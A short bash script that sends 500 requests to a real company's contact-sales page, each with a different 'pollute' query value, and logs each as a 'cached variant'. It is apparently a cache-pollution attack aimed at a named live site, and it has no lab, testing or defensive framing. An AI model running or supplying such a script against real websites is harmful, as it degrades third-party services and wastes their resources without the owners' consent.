#!/bin/bash
for i in $(seq 1 500); do
  curl -s -o /dev/null "https://www.omise.co/en/contact-sales?pollute=$i"
  echo "Cached variant: ?pollute=$i"
done
